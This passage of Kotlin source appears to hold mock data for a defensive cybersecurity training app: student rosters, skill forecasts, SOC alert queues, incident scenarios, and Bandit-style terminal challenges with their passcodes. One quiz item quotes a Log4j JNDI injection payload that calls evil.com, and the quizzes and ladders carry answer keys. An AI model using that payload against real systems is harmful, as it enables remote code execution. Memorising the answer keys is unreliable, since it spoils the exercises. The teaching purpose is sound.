        students = listOf(
          StudentProgressItem("s_01", "Alex Vance", "VANCE-SOC", 88, 6, 4, "Today"),
          StudentProgressItem("s_02", "Maya Lin", "CYBER-MAYA", 92, 7, 5, "Yesterday"),
          StudentProgressItem("s_03", "Kavita Patel", "HEX-HUNTER", 74, 5, 3, "2 days ago"),
          StudentProgressItem("s_04", "Marcus Brody", "CYBER-LEAD", 65, 4, 2, "3 days ago")
        )
      )
    )
  )
  val classrooms: StateFlow<List<ClassroomRoster>> = _classrooms.asStateFlow()

  fun createClassroom(name: String, assignedLessons: List<String>) {
    val newClass = ClassroomRoster(
      id = "class_${UUID.randomUUID().toString().take(8)}",
      name = name,
      instructorName = _userProfile.value.name,
      assignedLessonIds = assignedLessons,
      students = listOf(
        StudentProgressItem("s_demo1", "Jordan Hayes", "SENTINEL-X", 100, 8, 6, "Just now"),
        StudentProgressItem("s_demo2", "Taylor Reed", "REED-SEC", 50, 3, 2, "Today")
      )
    )
    _classrooms.value = _classrooms.value + newClass
  }

  val adminStats = AdminPlatformStats(
    totalLessonsCount = 18,
    totalLabsCount = 8,
    totalChallengesCount = 12,
    totalProjectsCount = 6,
    activeSimulations = 42,
    totalRegisteredLearners = 12840
  )

  // ==========================================
  // Aegora Master Architecture: Signature 7 Systems
  // ==========================================

  // 1. Cyber Learning Genome
  private val _learningGenome = MutableStateFlow(
    CyberLearningGenome(
      knowledgeScore = 78,
      practicalScore = 64,
      reasoningScore = 71,
      investigationScore = 58,
      communicationScore = 83,
      retentionScore = 69,
      decisionMakingScore = 61,
      learningVelocity = 84,
      currentBottleneck = "Investigation Correlation & Timestamp Triage",
      bottleneckDomain = "SOC Defense / DFIR",
      recommendedIntervention = "3 Multi-Source Log Correlation Scenarios in SOC Range",
      recommendedActionTarget = "lab_soc_01"
    )
  )
  val learningGenome: StateFlow<CyberLearningGenome> = _learningGenome.asStateFlow()

  // 2. Reasoning Graph & Active Investigation Fingerprint
  private val _activeReasoningGraph = MutableStateFlow(
    ReasoningGraph(
      incidentId = "inc_xz_backdoor",
      scenarioTitle = "CVE-2024-3094 Supply Chain Investigation",
      investigatedAt = "Today, 14:32",
      totalInvestigationSeconds = 274,
      steps = listOf(
        ReasoningGraphStep("s1", "Sysmon Event ID 1", "EVIDENCE_INSPECT", "Inspected sshd child processes and liblzma checksums", 22, true),
        ReasoningGraphStep("s2", "External IP 185.220.101.5", "EVIDENCE_INSPECT", "Checked external IP reputation on VirusTotal", 45, false),
        ReasoningGraphStep("s3", "False Lead Dismissed", "FALSE_LEAD_DISMISSED", "Dismissed benign NTP sync packet from chronyd", 78, true),
        ReasoningGraphStep("s4", "GnuPG Signature Check", "HYPOTHESIS_TEST", "Hypothesized malicious build artifact injection in m4/build-to-host.m4", 130, true),
        ReasoningGraphStep("s5", "RSA Decryption Hook", "IOC_LINKED", "Correlated liblzma hook directly to RSA_public_decrypt hijacking", 210, true),
        ReasoningGraphStep("s6", "System Isolation", "CONTAINMENT_TRIGGERED", "Issued emergency quarantine on affected Linux build server", 274, true)
      ),
      fingerprintEvidenceFirst = 82,
      fingerprintHypothesisFirst = 41,
      fingerprintTimelineAnalysis = 64,
      fingerprintIocCorrelation = 71,
      fingerprintContextChecking = 39,
      prematureClosureRisk = "LOW",
      expertShadowComparison = "You prioritized IOC hashing and binary verification. Senior SOC analysts typically verify chronological timestamps first to constrain search window, but your root-cause conclusion was flawless."
    )
  )
  val activeReasoningGraph: StateFlow<ReasoningGraph> = _activeReasoningGraph.asStateFlow()

  fun updateUserRole(newRole: UserRole) {
    val current = _userProfile.value
    _userProfile.value = current.copy(role = newRole)
  }

  fun logReasoningStep(step: ReasoningGraphStep) {
    val current = _activeReasoningGraph.value
    _activeReasoningGraph.value = current.copy(
      steps = current.steps + step,
      totalInvestigationSeconds = current.totalInvestigationSeconds + step.timeOffsetSeconds
    )
  }

  fun recordInvestigationAction(stepLabel: String, nodeType: String, description: String, isOptimal: Boolean = true) {
    val current = _activeReasoningGraph.value
    val newStep = ReasoningGraphStep(
      stepId = "s_${UUID.randomUUID().toString().take(6)}",
      nodeLabel = stepLabel,
      nodeType = nodeType,
      actionDescription = description,
      timeOffsetSeconds = 15,
      isOptimalStep = isOptimal
    )
    _activeReasoningGraph.value = current.copy(
      steps = current.steps + newStep,
      totalInvestigationSeconds = current.totalInvestigationSeconds + 15
    )
  }

  fun recordMistake(patternName: String, category: String, description: String, diagnosedIncident: String) {
    val current = _mistakeDnaRecords.value
    val existing = current.find { it.patternName.equals(patternName, ignoreCase = true) }
    if (existing != null) {
      _mistakeDnaRecords.value = current.map {
        if (it.id == existing.id) it.copy(occurrences = it.occurrences + 1) else it
      }
    } else {
      val newRecord = MistakeDnaRecord(
        id = "dna_${UUID.randomUUID().toString().take(6)}",
        patternName = patternName,
        category = category,
        occurrences = 1,
        severity = "Moderate",
        description = description,
        diagnosedIncident = diagnosedIncident,
        correctiveRemediation = "Review related SOC incident scenario"
      )
      _mistakeDnaRecords.value = current + newRecord
    }
  }

  // 3. Mistake DNA & Cognitive Bias Passport
  private val _mistakeDnaRecords = MutableStateFlow(
    listOf(
      MistakeDnaRecord(
        id = "dna_01",
        patternName = "Tunnel Vision on First Alert",
        category = "Cognitive Bias",
        occurrences = 4,
        severity = "Moderate",
        description = "Tendency to latch onto the initial alert IP without surveying secondary outbound egress channels.",
        diagnosedIncident = "Phishing Incident Lab #03",
        correctiveRemediation = "Complete 2 Multi-Channel Log Triage exercises"
      ),
      MistakeDnaRecord(
        id = "dna_02",
        patternName = "Missed Temporal Correlation",
        category = "Analytical Failure",
        occurrences = 3,
        severity = "Critical",
        description = "Analyzed process creation events in isolation without cross-referencing authentication timestamps in Event ID 4624.",
        diagnosedIncident = "Pass-the-Hash Active Directory Scenario",
        correctiveRemediation = "Review Windows Security Log Temporal Correlation Module"
      ),
      MistakeDnaRecord(
        id = "dna_03",
        patternName = "Alert Fatigue Quick-Dismiss",
        category = "Operational Bias",
        occurrences = 2,
        severity = "Minor",
        description = "Dismissed low-severity PowerShell execution because it contained standard cmdlets, missing base64 hidden payload.",
        diagnosedIncident = "Macro Maldoc Execution Lab",
        correctiveRemediation = "Complete Alert Fatigue Simulator Drill"
      ),
      MistakeDnaRecord(
        id = "dna_04",
        patternName = "Premature Case Closure",
        category = "Analytical Failure",
        occurrences = 1,
        severity = "Moderate",
        description = "Closed investigation after killing malicious process without checking scheduled task persistence mechanisms.",
        diagnosedIncident = "Persistence via Cron & Reg Keys Lab",
        correctiveRemediation = "Run ATT&CK Persistence Scoping Lab"
      )
    )
  )
  val mistakeDnaRecords: StateFlow<List<MistakeDnaRecord>> = _mistakeDnaRecords.asStateFlow()

  // 4. Skill Decay Radar & Forgetting Forecast
  private val _skillDecayForecasts = MutableStateFlow(
    listOf(
      SkillDecayForecast(
        skillId = "skill_linux_cli",
        skillName = "Linux Forensics & CLI Triage",
        domain = "Endpoint & OS",
        currentHealth = 81,
        retentionScore = 73,
        lastPracticedDaysAgo = 12,
        riskLevel = "MEDIUM",
        projected7Days = 77,
        projected30Days = 65,
        projected60Days = 52,
        recommendedDiagnosticTitle = "15-Min Linux /var/log Forensics Diagnostic",
        diagnosticEstimatedMins = 15
      ),
      SkillDecayForecast(
        skillId = "skill_sysmon",
        skillName = "Sysmon & Windows Event Triage",
        domain = "SOC Defense",
        currentHealth = 94,
        retentionScore = 91,
        lastPracticedDaysAgo = 2,
        riskLevel = "LOW",
        projected7Days = 92,
        projected30Days = 85,
        projected60Days = 74,
        recommendedDiagnosticTitle = "Sysmon Event ID 1, 3, 7 Speed Drill",
        diagnosticEstimatedMins = 10
      ),
      SkillDecayForecast(
        skillId = "skill_network_wireshark",
        skillName = "Network Packet & PCAP Analysis",
        domain = "Network Security",
        currentHealth = 58,
        retentionScore = 51,
        lastPracticedDaysAgo = 28,
        riskLevel = "HIGH",
        projected7Days = 52,
        projected30Days = 39,
        projected60Days = 26,
        recommendedDiagnosticTitle = "TLS Handshake & DNS Tunneling PCAP Refresher",
        diagnosticEstimatedMins = 20
      ),
      SkillDecayForecast(
        skillId = "skill_sigma_rules",
        skillName = "Detection Engineering (Sigma/YARA)",
        domain = "Detection Eng",
        currentHealth = 72,
        retentionScore = 68,
        lastPracticedDaysAgo = 9,
        riskLevel = "MEDIUM",
        projected7Days = 69,
        projected30Days = 58,
        projected60Days = 44,
        recommendedDiagnosticTitle = "Rule Creation for Mimikatz LSASS Access",
        diagnosticEstimatedMins = 15
      ),
      SkillDecayForecast(
        skillId = "skill_cloud_iam",
        skillName = "AWS IAM Privilege Escalation",
        domain = "Cloud Security",
        currentHealth = 44,
        retentionScore = 40,
        lastPracticedDaysAgo = 41,
        riskLevel = "CRITICAL",
        projected7Days = 38,
        projected30Days = 24,
        projected60Days = 15,
        recommendedDiagnosticTitle = "CloudTrail & AssumeRole Policy Audit Drill",
        diagnosticEstimatedMins = 25
      )
    )
  )
  val skillDecayForecasts: StateFlow<List<SkillDecayForecast>> = _skillDecayForecasts.asStateFlow()

  // 5. Concept Collision Engine
  val conceptCollisions = listOf(
    ConceptCollision(
      id = "cc_01",
      pairTitle = "SIEM vs. SOAR",
      conceptA = "SIEM (Security Information & Event Management)",
      conceptB = "SOAR (Security Orchestration, Automation & Response)",
      confusionRatePercent = 78,
      scenarioPrompt = "Your SOC receives 2,000 alerts per hour. A system automatically triggers a Python playbook to query VirusTotal, block a malicious IP on the perimeter firewall, and isolate an endpoint without human intervention. What system executed this workflow?",
      options = listOf(
        "SIEM (Log aggregator and correlation engine)",
        "SOAR (Automation & response playbook engine)",
        "EDR (Endpoint-only kernel driver)",
        "IDS (Passive intrusion detection system)"
      ),
      correctIndex = 1,
      explanation = "SOAR handles automated orchestration and response playbooks (taking actions like firewall IP blocking), whereas SIEM aggregates, indexes, and correlates telemetry to trigger the initial alert.",
      distinctionKey = "SIEM detects and centralizes; SOAR automates action and orchestration."
    ),
    ConceptCollision(
      id = "cc_02",
      pairTitle = "IDS vs. IPS",
      conceptA = "IDS (Intrusion Detection System)",
      conceptB = "IPS (Intrusion Prevention System)",
      confusionRatePercent = 64,
      scenarioPrompt = "A signature-based network appliance sits inline in the physical traffic path and actively drops TCP packets containing an Exploit Kit shellcode payload before it reaches the internal server. What appliance is this?",
      options = listOf(
        "Network Tap with IDS",
        "IPS (Intrusion Prevention System)",
        "SIEM Forwarder",
        "Passive Network Sniffer"
      ),
      correctIndex = 1,
      explanation = "An IPS sits inline and actively drops or terminates malicious sessions. An IDS operates out-of-band (via SPAN/TAP) and generates alerts without dropping traffic.",
      distinctionKey = "IDS is passive detection; IPS is active inline prevention."
    ),
    ConceptCollision(
      id = "cc_03",
      pairTitle = "Hashing vs. Encryption",
      conceptA = "Cryptographic Hashing (One-Way)",
      conceptB = "Symmetric/Asymmetric Encryption (Two-Way)",
      confusionRatePercent = 82,
      scenarioPrompt = "You need to store user passwords in a database so that even if the database is leaked in plaintext, attackers cannot mathematically reverse the stored strings back into passwords. What must you use?",
      options = listOf(
        "AES-256 Symmetric Encryption",
        "Salted Argon2id / bcrypt Cryptographic Hash",
        "RSA-4096 Asymmetric Key Pair",
        "Base64 Obfuscation"
      ),
      correctIndex = 1,
      explanation = "Hashing is a one-way mathematical function designed to be non-reversible. Encryption is two-way and reversible with a decryption key.",
      distinctionKey = "Hashing = irreversible integrity check; Encryption = reversible confidentiality."
    ),
    ConceptCollision(
      id = "cc_04",
      pairTitle = "Authentication vs. Authorization",
      conceptA = "Authentication (AuthN - Who are you?)",
      conceptB = "Authorization (AuthZ - What can you do?)",
      confusionRatePercent = 71,
      scenarioPrompt = "A user successfully logs into AWS using their hardware MFA security key. However, when attempting to delete an S3 bucket, they receive an 'Access Denied: Explicit Deny in IAM Policy' error. At what stage did the failure occur?",
      options = listOf(
        "Authentication (AuthN)",
        "Authorization (AuthZ)",
        "Single Sign-On (SSO)",
        "Directory Sync"
      ),
      correctIndex = 1,
      explanation = "Authentication verified identity successfully (MFA passed). Authorization evaluated permissions and rejected the action based on IAM policy.",
      distinctionKey = "AuthN verifies Identity; AuthZ verifies Permissions."
    ),
    ConceptCollision(
      id = "cc_05",
      pairTitle = "Vulnerability vs. Exploit",
      conceptA = "Vulnerability (The Flaw / Weakness)",
      conceptB = "Exploit (The Weaponized Code / Technique)",
      confusionRatePercent = 55,
      scenarioPrompt = "Log4j contains a flaw in JNDI lookup handling (CVE-2021-44228). A Python script sends '${'$'}{jndi:ldap://evil.com/payload}' to trigger remote code execution. What is the Python script called?",
      options = listOf(
        "The Vulnerability",
        "The Exploit",
        "The Threat Actor",
        "The Mitigation"
      ),
      correctIndex = 1,
      explanation = "The vulnerability is the flaw in Log4j. The script taking advantage of that flaw to deliver a payload is the exploit.",
      distinctionKey = "Vulnerability = hole in the defense; Exploit = tool used to breach the hole."
    )
  )

  // 6. Alert Fatigue Simulator Queue (120 alerts sample generator / list)
  val alertFatigueQueue: List<AlertFatigueItem> = listOf(
    AlertFatigueItem("alt_01", "14:02:11", "CrowdStrike: LSASS Memory Dumping Attempt", "10.0.4.12", "WKSTN-FIN-09", "Critical", "Procdump invoked against lsass.exe process by user 'svc_backup'", true, false),
    AlertFatigueItem("alt_02", "14:02:14", "FortiGate: Port Scan Detected", "192.168.1.100", "FIREWALL-01", "Low", "Routine vulnerability scanner Qualys running scheduled discovery", false, true),
    AlertFatigueItem("alt_03", "14:02:19", "Suricata: Outbound HTTPS to Dynamic DNS", "10.0.4.12", "C2-HOST-XZ", "Critical", "Continuous 10-second beaconing to *.chickenkiller.com", true, false),
    AlertFatigueItem("alt_04", "14:02:22", "Windows Defender: EICAR Test File Detected", "10.0.2.55", "DEV-TEST-01", "Info", "Developer downloaded EICAR antivirus verification string", false, true),
    AlertFatigueItem("alt_05", "14:02:30", "Splunk: Multiple Failed SSH Logins (Brute Force)", "172.16.0.4", "LINUX-PROD-DB", "High", "350 failed login attempts in 60 seconds from unauthorized subnet", true, false),
    AlertFatigueItem("alt_06", "14:02:35", "Zscaler: User Navigated to Uncategorized Web Domain", "10.0.1.18", "WKSTN-HR-02", "Low", "User visited newly registered domain recipe-blog.net", false, true),
    AlertFatigueItem("alt_07", "14:02:41", "Sysmon Event ID 1: Encoded PowerShell Command", "10.0.4.12", "WKSTN-FIN-09", "Critical", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...", true, false),
    AlertFatigueItem("alt_08", "14:02:49", "Palo Alto: DNS Query for Known Malicious Sinkhole", "10.0.3.88", "SRV-FILE-02", "Critical", "Host querying sinkhole.threatintel.org matching LockBit C2", true, false),
    AlertFatigueItem("alt_09", "14:02:55", "Office 365: Risky Sign-In from Impossible Travel", "10.0.0.1", "CLOUD-O365", "High", "User logged in from Chicago then Frankfurt within 12 minutes", true, false),
    AlertFatigueItem("alt_10", "14:03:02", "Nessus: Expired SSL Certificate on Internal Host", "192.168.10.4", "INTRANET-PORTAL", "Low", "Self-signed certificate on internal staging host expired yesterday", false, true)
  )

  // 7. Uncertainty Training Scenarios
  val uncertaintyScenarios: List<UncertaintyScenario> = listOf(
    UncertaintyScenario(
      id = "unc_01",
      title = "High-Volume PowerShell Execution in Accounting Subnet",
      contextBrief = "Accounting workstation WKSTN-ACCT-04 spawned powershell.exe under excel.exe with argument: -ExecutionPolicy Bypass -NoProfile -W Hidden Get-ItemProperty.",
      rawLogSnippet = "EventID: 4688 | ParentProcess: EXCEL.EXE | CommandLine: powershell.exe -ep bypass -w hidden Get-ChildItem -Path C:\\Users\\*\\AppData\\Roaming -Recurse",
      maliciousConfidence = 68,
      benignConfidence = 22,
      unknownConfidence = 10,
      expertRecommendedDecision = "CONTAIN & ISOLATE IMMEDIATELY",
      expertRationale = "Excel spawning hidden PowerShell scanning user AppData directories strongly indicates an Initial Access macro payload staging discovery scripts before lateral movement."
    ),
    UncertaintyScenario(
      id = "unc_02",
      title = "Anomalous Outbound DNS Query Spike at 03:00 AM",
      contextBrief = "Domain Controller queried 8,400 subdomains of 'cdn-cache-sync.info' with high entropy alphanumeric prefixes over 15 minutes.",
      rawLogSnippet = "DNS Query: a9f8e71b.cdn-cache-sync.info | TXT Record Response Length: 512 bytes | Rate: 140 qps",
      maliciousConfidence = 84,
      benignConfidence = 8,
      unknownConfidence = 8,
      expertRecommendedDecision = "BLOCK DNS ZONE & ESCALATE TO DFIR",
      expertRationale = "High-entropy subdomains with oversized TXT record responses at off-hours matches classic DNS Data Exfiltration / C2 Tunneling (e.g. Iodine/DNSCat2)."
    )
  )

  // 8. Counterfactual Consequence Branches
  val counterfactualBranches: List<CounterfactualBranch> = listOf(
    CounterfactualBranch(
      id = "cb_01",
      decisionChoice = "Immediate Workstation Host Isolation (At Minute 0)",
      outcomeTitle = "Attack Contained in Stage 1",
      simulationResultDescription = "Attacker C2 session terminated. No lateral movement occurred. Credentials remained uncompromised in memory.",
      lateralMovementOccurred = false,
      dataExfiltratedMb = 0,
      businessImpactScore = "Minimal Impact"
    ),
    CounterfactualBranch(
      id = "cb_02",
      decisionChoice = "Delayed Action by 15 Minutes for Additional PCAP Verification",
      outcomeTitle = "Lateral Movement to Domain Controller",
      simulationResultDescription = "Attacker dumped LSASS memory, extracted Kerberos Ticket Granting Tickets (TGT), and pivoted to DC-01 using Pass-the-Ticket.",
      lateralMovementOccurred = true,
      dataExfiltratedMb = 1450,
      businessImpactScore = "Severe Breach"
    ),
    CounterfactualBranch(
      id = "cb_03",
      decisionChoice = "Wrong Host Isolated (Isolated Web Gateway instead of Finance Endpoint)",
      outcomeTitle = "Attacker Persistence via Scheduled Task",
      simulationResultDescription = "Attacker remained undetected on true infected host WKSTN-FIN-09, installed WMI persistence, and scheduled nightly data staging.",
      lateralMovementOccurred = true,
      dataExfiltratedMb = 4200,
      businessImpactScore = "Catastrophic"
    )
  )

  // 9. Stakeholder Translation Scenarios
  val stakeholderScenarios: List<StakeholderTranslationScenario> = listOf(
    StakeholderTranslationScenario(
      id = "stk_01",
      incidentCode = "INC-2026-882",
      technicalIncidentBrief = "LockBit ransomware variant executed via CVE-2023-4966 (Citrix Bleed) memory dump, compromised active directory admin credentials, and encrypted 14 ESXi virtual hosts.",
      executivePersona = "CEO & Board of Directors",
      personaGoal = "Understand business outage, revenue impact, customer data exposure risk, and time to operational recovery without technical jargon.",
      goodSampleSummary = "At 02:00 AM, our security perimeter detected an unauthorized breach affecting our internal server virtualizers. We immediately isolated the core network to protect client databases. No evidence of customer data theft has been detected. Core business operations are running in failover mode with estimated 100% restoration in 6 hours.",
      flawedJargonSummary = "Citrix Bleed CVE-2023-4966 allowed unauthenticated session token exfiltration from netscaler memory leading to Pass-the-Hash Kerberos Golden Ticket forgery on DC-01 and ESXi VMDK encryption.",
      scoringRubricNotes = "Evaluate jargon avoidance (0-30), business risk clarity (0-40), and mitigation confidence (0-30)."
    )
  )

  // 10. MITRE ATT&CK Matrix Coverage
  val mitreTacticCoverages: List<MitreTacticCoverage> = listOf(
    MitreTacticCoverage("TA0001", "Initial Access", 9, 6, 67, listOf("T1566 Phishing", "T1190 Exploit Public-Facing App", "T1078 Valid Accounts")),
    MitreTacticCoverage("TA0002", "Execution", 14, 11, 79, listOf("T1059 Command & Scripting", "T1204 User Execution", "T1047 WMI Execution")),
    MitreTacticCoverage("TA0003", "Persistence", 19, 12, 63, listOf("T1053 Scheduled Task/Cron", "T1547 Boot or Logon Autostart", "T1098 Account Manipulation")),
    MitreTacticCoverage("TA0004", "Privilege Escalation", 13, 8, 62, listOf("T1068 Exploitation for Priv Esc", "T1548 Abuse Elevation Control", "T1134 Access Token Manipulation")),
    MitreTacticCoverage("TA0005", "Defense Evasion", 42, 28, 67, listOf("T1070 Indicator Removal", "T1027 Obfuscated Files", "T1562 Impair Defenses")),
    MitreTacticCoverage("TA0006", "Credential Access", 17, 13, 76, listOf("T1003 OS Credential Dumping", "T1558 Steal Kerberos Tickets", "T1110 Brute Force")),
    MitreTacticCoverage("TA0007", "Discovery", 31, 22, 71, listOf("T1087 Account Discovery", "T1082 System Info Discovery", "T1049 System Network Connections")),
    MitreTacticCoverage("TA0008", "Lateral Movement", 9, 7, 78, listOf("T1021 Remote Services", "T1550 Use Alternate Auth Material", "T1570 Lateral Tool Transfer"))
  )

  // 11. Simulated Experience Ledger
  private val _simulatedExperience = MutableStateFlow(
    SimulatedExperienceLedger(
      socInvestigationsCount = 47,
      incidentSimulationsCount = 31,
      detectionEngineeringExercises = 19,
      ctfFlagsCapturedCount = 14,
      portfolioProjectsCompleted = 7,
      crisisDecisionsCount = 83
    )
  )
  val simulatedExperience: StateFlow<SimulatedExperienceLedger> = _simulatedExperience.asStateFlow()

  // 12. Reverse Roadmap Job Analyzer
  private val _sampleReverseRoadmaps = MutableStateFlow(
    listOf(
      ReverseRoadmapAnalysis(
        jobTitle = "L1 SOC Analyst (Threat Monitoring)",
        targetCompanySample = "CrowdStrike Global MSSP",
        matchPercentage = 86,
        verifiedMatchingSkills = listOf("SIEM Alert Triage (Splunk/Elastic)", "Sysmon Windows Logs", "Network TCP/IP Forensics", "MITRE ATT&CK Mapping"),
        missingGapSkills = listOf("Kusto Query Language (KQL)", "Active Directory Kerberoasting Triage"),
        shortestEvidencePath = listOf(
          "Complete Lab #04: KQL Threat Hunting queries on Azure Sentinel",
          "Solve Pass-the-Ticket scenario in Active Directory Range",
          "Deploy GitHub Project: Automated Suricata Alert Forwarder"
        ),
        estimatedWeeksToCloseGap = 3
      ),
      ReverseRoadmapAnalysis(
        jobTitle = "Junior Detection Engineer",
        targetCompanySample = "Datadog Cloud Security",
        matchPercentage = 68,
        verifiedMatchingSkills = listOf("Sigma Rule Authoring", "Linux Auditd", "Python Log Parsers"),
        missingGapSkills = listOf("YARA Memory Signatures", "AWS CloudTrail Event Bridge Detections", "CI/CD Detection Testing (pytest)"),
        shortestEvidencePath = listOf(
          "Complete Detection Studio: YARA rules for unpacked Cobalt Strike beacons",
          "Build Project #03: Multi-Cloud IAM Drift & GuardDuty Pipeline",
          "Conduct 2 Sigma unit test validation runs"
        ),
        estimatedWeeksToCloseGap = 6
      )
    )
  )
  val sampleReverseRoadmaps: StateFlow<List<ReverseRoadmapAnalysis>> = _sampleReverseRoadmaps.asStateFlow()
  val reverseRoadmaps: List<ReverseRoadmapAnalysis> get() = _sampleReverseRoadmaps.value

  fun analyzePastedJobDescription(title: String, jobText: String): ReverseRoadmapAnalysis {
    val textLower = jobText.lowercase()
    val matched = mutableListOf<String>()
    val missing = mutableListOf<String>()

    if (textLower.contains("siem") || textLower.contains("splunk") || textLower.contains("log")) {
      matched.add("SIEM Log Analysis & Splunk Indexing")
    } else {
      missing.add("Enterprise SIEM Architecture")
    }

    if (textLower.contains("linux") || textLower.contains("bash") || textLower.contains("terminal")) {
      matched.add("Linux CLI & /var/log Investigation")
    }

    if (textLower.contains("windows") || textLower.contains("event") || textLower.contains("sysmon")) {
      matched.add("Windows Security Event ID Forensics")
    }

    if (textLower.contains("python") || textLower.contains("script")) {
      matched.add("Python Incident Automation Scripts")
    } else {
      missing.add("Security Automation & Python")
    }

    if (textLower.contains("cloud") || textLower.contains("aws") || textLower.contains("azure")) {
      missing.add("Cloud IAM & CloudTrail Triage")
    }

    if (textLower.contains("mitre") || textLower.contains("ttp")) {
      matched.add("MITRE ATT&CK Framework Mapping")
    }

    val matchScore = if (matched.isEmpty()) 45 else (matched.size * 100 / (matched.size + missing.size)).coerceIn(35, 95)
    val analysis = ReverseRoadmapAnalysis(
      jobTitle = if (title.isBlank()) "Custom Analyzed Security Role" else title,
      targetCompanySample = "Extracted from Provided Job Description",
      matchPercentage = matchScore,
      verifiedMatchingSkills = if (matched.isEmpty()) listOf("Core Cyber Foundations") else matched,
      missingGapSkills = if (missing.isEmpty()) listOf("Advanced Memory Forensics (Volatility)") else missing,
      shortestEvidencePath = listOf(
        "Execute 2 targeted labs addressing ${missing.firstOrNull() ?: "advanced threat hunting"}",
        "Add cryptographic lab artifact hashes directly to your Skill Passport",
        "Generate automated resume evidence bullets for your portfolio"
      ),
      estimatedWeeksToCloseGap = ((100 - matchScore) / 10).coerceAtLeast(2)
    )

    _sampleReverseRoadmaps.value = listOf(analysis) + _sampleReverseRoadmaps.value
    return analysis
  }

  // 13. Energy-Aware Learning Mode
  private val _currentEnergyLevel = MutableStateFlow(EnergyLevel.BALANCED)
  val currentEnergyLevel: StateFlow<EnergyLevel> = _currentEnergyLevel.asStateFlow()

  fun setEnergyLevel(level: EnergyLevel) {
    _currentEnergyLevel.value = level
  }

  // =========================================================================
  // 14. SEQUENTIAL TERMINAL LADDERS (Bandit Linux + UnderTheWire PowerShell)
  // =========================================================================
  private val _linuxLadder = MutableStateFlow(
    listOf(
      TerminalLadderLevel(
        levelNumber = 0,
        title = "Level 0 → Level 1: Terminal Initialization & SSH Basics",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password for the next level is stored in a file called 'readme' located in the home directory. Inspect the directory and read the file.",
        expectedCommandPattern = "cat readme|cat ./readme",
        solutionPasscode = "NHJ9-LNX0-BANDIT-A82",
        hints = listOf("Use 'ls' or 'ls -la' to view files in current directory", "Use 'cat readme' to view contents"),
        sampleCommands = listOf("ls -la", "cat readme", "pwd"),
        mockTerminalOutput = "NHJ9-LNX0-BANDIT-A82\n[+] Credentials captured! Level 1 unlocked.",
        skillArea = "Linux Fundamentals",
        isUnlocked = true,
        isCompleted = true
      ),
      TerminalLadderLevel(
        levelNumber = 1,
        title = "Level 1 → Level 2: Dashed Filenames & Stdout Redirects",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password for Level 2 is stored in a file named '-'. Standard 'cat -' reads from stdin; supply the explicit relative path.",
        expectedCommandPattern = "cat ./-|cat /home/bandit1/-",
        solutionPasscode = "CV92-DASH-BYPASS-911",
        hints = listOf("Typing 'cat -' waits for keyboard input", "Specify the path as './-' so the shell doesn't parse '-' as a flag"),
        sampleCommands = listOf("ls", "cat ./-", "file ./-"),
        mockTerminalOutput = "CV92-DASH-BYPASS-911\n[+] Level 2 credentials revealed!",
        skillArea = "Linux Shell Mechanics",
        isUnlocked = true,
        isCompleted = false
      ),
      TerminalLadderLevel(
        levelNumber = 2,
        title = "Level 2 → Level 3: Filenames with Whitespace & Escapes",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password for Level 3 is stored in a file named 'spaces in this filename'. Read its contents using quotes or escaping.",
        expectedCommandPattern = "cat \"spaces in this filename\"|cat 'spaces in this filename'|cat spaces\\ in\\ this\\ filename",
        solutionPasscode = "SPCE-9812-ESCAPE-Q33",
        hints = listOf("Wrap the filename in double quotes or escape each space with backslashes \\"),
        sampleCommands = listOf("cat \"spaces in this filename\"", "cat spaces\\ in\\ this\\ filename"),
        mockTerminalOutput = "SPCE-9812-ESCAPE-Q33\n[+] Password revealed.",
        skillArea = "Linux Shell Mechanics",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 3,
        title = "Level 3 → Level 4: Hidden Dotfiles & Directory Traversals",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password for Level 4 is stored in a hidden file inside the directory 'inhere'.",
        expectedCommandPattern = "ls -la inhere|cd inhere && cat .hidden|cat inhere/.hidden",
        solutionPasscode = "HDDN-4491-DOTFILE-77K",
        hints = listOf("Standard 'ls' skips dotfiles. Use 'ls -la inhere'", "Read the dotfile with 'cat inhere/.hidden'"),
        sampleCommands = listOf("cd inhere", "ls -la", "cat .hidden"),
        mockTerminalOutput = "total 12\ndrwxr-xr-x 2 bandit3 bandit3 4096 Aug 25 10:00 .\n-rw-r--r-- 1 bandit3 bandit3   33 Aug 25 10:00 .hidden\nHDDN-4491-DOTFILE-77K",
        skillArea = "Linux File System",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 4,
        title = "Level 4 → Level 5: Human-Readable File Identification",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password for Level 5 is stored in the only human-readable file in the 'inhere' directory amongst 10 binary files.",
        expectedCommandPattern = "file inhere/*|cat inhere/-file07",
        solutionPasscode = "ASCII-9938-TEXT-FIND",
        hints = listOf("Use 'file inhere/*' to inspect file types", "Look for 'ASCII text' output and cat that specific file"),
        sampleCommands = listOf("file inhere/*", "cat inhere/-file07"),
        mockTerminalOutput = "inhere/-file01: data\ninhere/-file02: data\ninhere/-file07: ASCII text\nASCII-9938-TEXT-FIND",
        skillArea = "Linux Forensics",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 5,
        title = "Level 5 → Level 6: Finding Files by Size & Ownership with 'find'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "Find the file inside 'inhere' that is human-readable, exactly 1033 bytes in size, and not executable.",
        expectedCommandPattern = "find inhere -size 1033c ! -executable|cat $(find inhere -size 1033c)",
        solutionPasscode = "FIND-1033-BYTE-MATCH",
        hints = listOf("Use 'find inhere -size 1033c'", "Add '! -executable' to filter out binary flags"),
        sampleCommands = listOf("find inhere -size 1033c", "cat inhere/maybehere07/.file2"),
        mockTerminalOutput = "inhere/maybehere07/.file2\nFIND-1033-BYTE-MATCH",
        skillArea = "Linux File System",
        isUnlocked = false
      ),
      TerminalLadderLevel(
        levelNumber = 6,
        title = "Level 6 → Level 7: System-Wide Ownership Searches with 'find'",
        systemPrompt = "aegora-bandit@sandbox:~$",
        goalDescription = "The password is stored somewhere on the server owned by user 'bandit7', owned by group 'bandit6', and 33 bytes in size.",
        expectedCommandPattern = "find / -user bandit7 -group bandit6 -size 33c 2>/dev/null",
        solutionPasscode = "SYS6-OWNR-SEARCH-881",
        hints = listOf("Search from root '/' with '-user bandit7 -group bandit6 -size 33c'", "Redirect permission denied noise with '2>/dev/null'"),
